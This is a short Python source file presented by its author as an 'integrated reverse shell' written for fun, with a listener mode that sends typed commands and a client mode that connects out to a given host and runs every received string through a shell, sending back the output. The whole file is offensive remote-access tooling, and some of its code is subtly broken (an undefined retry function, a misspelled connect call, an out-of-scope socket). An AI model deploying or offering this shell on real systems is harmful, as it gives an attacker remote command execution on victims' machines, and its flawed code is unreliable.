"""
author: Heecheon Park
reason: For fun

This is an integrated reverse shell.
It is simple yet does its job without complexity.
"""
import argparse
import os
import socket
import subprocess
import sys

# Send commands
def send_commands(conn):
    while True:
        cmd = input()
        if cmd == "quit":
            conn.close()
            sock.close()
            sys.exit()

        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), "utf-8")
            print(client_response, end="")

def server(port): 
    try:
        host = ""
        port = int(port)
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except socket.error as msg:
        print("Socket creation error: " + str(msg))

    try:
        print("Binding socket to port: " + str(port))
        sock.bind((host, port))
        sock.listen(5)
    except socket.error as msg:
        print("Socket binding error: " + str(msg)+ "\n"+ "Retrying....")
        socket_bind()
        
    conn, addr = sock.accept()
    print("Connection has been established | " +"IP "+ addr[0]+ "| port "+str(addr[1]))
    send_commands(conn)
    conn.close()

def client(host, port):
    host = host
    port = port
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        sock.connect((host, port))
    except socket.error as msg:
        print("Socket connection error: " + str(msg) + "Retrying....")
        sock.connet((host, port))

    while True:
        data = sock.recv(1024)
        if data[:2].decode("utf-8") == "cd":
            os.chdir(data[3:].decode("utf-8"))

        if len(data) > 0:
            cmd = subprocess.Popen(data[0:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output_bytes = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_bytes, "utf-8")
            sock.send(str.encode(output_str + str(os.getcwd() + '> ')))
            print(output_str) # This line is for testing


def main():
    parser = argparse.ArgumentParser(description="Run as a server or client!")
    parser.add_argument("-m", help="Running as a server or a client.")
    parser.add_argument("-t", help="Target IP")
    parser.add_argument("-p", type=int, help="TCP Port")
    args = parser.parse_args()

    print("This program is running as a " + args.m + '.')
    print("Do not use this program for a guffy stuff....")
    print("Use ctrl+c to quit the program!\n")
    if args.m == "server":
        server(args.p)
    else:
        client(args.t, args.p)

if __name__ == "__main__":
    main()
            


